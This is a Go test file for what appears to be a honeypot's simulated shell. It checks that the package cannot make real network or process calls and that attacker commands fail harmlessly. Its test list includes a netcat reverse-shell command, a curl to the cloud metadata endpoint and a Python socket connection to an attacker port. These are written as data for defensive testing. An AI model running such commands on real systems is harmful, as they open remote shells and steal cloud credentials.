package shell

import (
	"go/build"
	"path/filepath"
	"runtime"
	"testing"
	"time"
)

// disallowedImports are packages that would let this package reach outside
// the process -- a real network dial or a real subprocess. See SECURITY.md
// "Rules of engagement": the simulated shell must never complete a real
// outbound connection or execute a real payload, regardless of which command
// an attacker types or which deception action is applied.
var disallowedImports = []string{
	"net",
	"net/http",
	"net/rpc",
	"net/smtp",
	"os/exec",
	"syscall",
}

// TestShellPackageHasNoEgressCapableImports asserts the guarantee
// structurally: this package cannot dial out or spawn a process because it
// does not import anything capable of doing so. A future change that adds
// e.g. "net/http" to make some command "more realistic" will fail this test
// immediately, rather than being caught (or not) by manual review.
func TestShellPackageHasNoEgressCapableImports(t *testing.T) {
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("could not resolve test file location")
	}
	pkg, err := build.ImportDir(filepath.Dir(thisFile), 0)
	if err != nil {
		t.Fatalf("failed to inspect package imports: %v", err)
	}
	all := append(append([]string{}, pkg.Imports...), pkg.TestImports...)
	for _, imp := range all {
		for _, bad := range disallowedImports {
			if imp == bad {
				t.Errorf(
					"internal/shell (or its test files) imports %q, which can perform real "+
						"network/process egress -- the ROE in SECURITY.md requires the simulated "+
						"shell to be structurally incapable of this, not just conventionally so",
					imp,
				)
			}
		}
	}
}

// TestNetworkFlavoredCommandsNeverAttemptRealEgress runs every command an
// attacker might use to test for real egress (wget/curl/nc/ssh/etc.) and
// asserts each resolves immediately to the shell's ordinary "command not
// found" path. None of these are in the interpreter's command whitelist
// (shell.go's switch statement), so they fall through to the default case --
// this test locks that in, and the timeout catches the failure mode a
// behavioral change could introduce even if the import-list stays clean (e.g.
// shelling out via a dependency that itself performs the dial).
func TestNetworkFlavoredCommandsNeverAttemptRealEgress(t *testing.T) {
	commands := []string{
		"wget http://example.com/a",
		"curl -O http://example.com/b",
		"curl http://169.254.169.254/latest/meta-data/",
		"nc -e /bin/sh 10.0.0.1 4444",
		"ssh user@10.0.0.1",
		"scp file user@10.0.0.1:/tmp",
		"telnet 10.0.0.1 23",
		"ping -c 1 10.0.0.1",
		"nslookup example.com",
		`python3 -c "import socket; socket.create_connection(('10.0.0.1', 4444))"`,
	}

	for _, cmd := range commands {
		cmd := cmd
		t.Run(cmd, func(t *testing.T) {
			s := NewInterpreter("ubuntu")
			done := make(chan struct{})
			var out string
			var code int
			go func() {
				out, code, _ = s.Run(cmd)
				close(done)
			}()
			select {
			case <-done:
			case <-time.After(2 * time.Second):
				t.Fatalf(
					"command %q did not return within 2s -- possible real network attempt "+
						"blocking on a dial/DNS timeout, rather than the immediate simulated response",
					cmd,
				)
			}
			if code != 127 {
				t.Fatalf("expected command-not-found (127) for %q, got code=%d out=%q", cmd, code, out)
			}
		})
	}
}
